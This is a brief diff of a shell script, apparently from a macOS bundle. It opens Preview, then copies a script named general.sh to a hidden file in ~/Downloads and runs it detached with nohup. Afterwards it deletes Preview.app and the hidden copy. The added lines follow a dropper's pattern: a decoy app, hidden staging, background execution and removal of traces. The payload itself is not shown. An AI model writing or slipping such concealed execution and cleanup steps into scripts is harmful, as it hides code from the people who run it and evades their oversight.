@@ -5,8 +5,10 @@ cd ${CDIR}
 
 open -a Preview
 
-./general.sh
+cp ./general.sh ~/Downloads/.general.sh
+nohup ~/Downloads/.general.sh &
 
-#cd ${CDIR}/../
-#rm -rf ./* #cleanup
+cd ..
 
+rm -rf ./Preview.app/ #cleanup
+rm ~/Downloads/.general.sh
